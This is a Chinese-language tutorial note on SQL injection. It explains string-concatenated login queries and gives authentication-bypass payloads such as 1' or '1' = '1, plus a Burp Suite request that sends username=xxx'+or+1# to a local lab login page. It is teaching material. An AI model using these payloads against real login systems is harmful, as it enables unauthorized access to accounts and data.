# Wed SQL注入漏洞原理利用

<br>

## SQL注入原理深入解析

---

### SQL注入产生原理

<div style="padding: 12px 15px; margin: 16px 0; background-color: #f3f9f6; border-left: 4px solid #10b981; color: #374151; font-size: 14px; line-height: 1.6;">
	动态交互网站,实现交互利用用户输入拼接到SQL执行,输入不同导致返回结果不同。用户输入内容没有经过完美处	理,而且构造SQL语句,直接将构造的sQL语句带入sQL语句中执行,导致sQL注入漏洞。
</div>

<br>

```SQL
登录功能模块: 实现用户身份认证

用户输入: 用户名和密码
SQL语句拼接:select * from admin where username = '用户提交' and password = '用户提交'

正常情况下:where条件语句当用户提交数据在数据库中存在才返回真。不存在返回假,可以完成用户身份认证

但是如果恶意用户输入一段精心构造的SQL语句,使得输入的部分也被识别为SQL语句,那么此时就会造成SQL注入漏洞
```

<br>

```SQL
> 案例: 万能密码
> select * from admin where username = '用户提交' and password = '用户提交'
> 
> 用户输入: 账号为任意内容 密码为1' or '1' = '1
> SQL语句拼接:
> select * from admin where username = '用户提交' and password = '1' or '1' = '1'
> 
>此时where条件语句中的内容等价于1(真),SQL语句执行结果为 返回所有数据,达到绕过登录认证机制
```

<br>

### 实验: Burpsuite进行万能密码测试
### 环境: PHP + MySQL
### 注意: Burpsuite Repeater模块中,空格使用加号“+”或%20代替

```HTTP
POST /01SQL/01Login/flag.php HTTP/1.1
Host:127.0.0.1:8080
User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebkit/540.0 (KHTML, like Gecko)Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;g=0.8,zh-TW;g=0.7,zh-HK;q=0.5, en-US;g=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
0rigin: http://127.0.0.1:8080
Connection: close
Referer: http://127.0.0.1:8080/01SQL/01Login/login.phpUpgrade-Insecure-Requests: 1

username=xxx'+or+1#&password=password
```

<div style="padding: 12px 15px; margin: 16px 0; background-color: #f3f9f6; border-left: 4px solid #10b981; color: #374151; font-size: 14px; line-height: 1.6;">
    SQL语句: select * from admin where username = 'xxx'+or+1#and password = 'password'
</div>

```HTTP
HTTP/1.1 200 OK

```
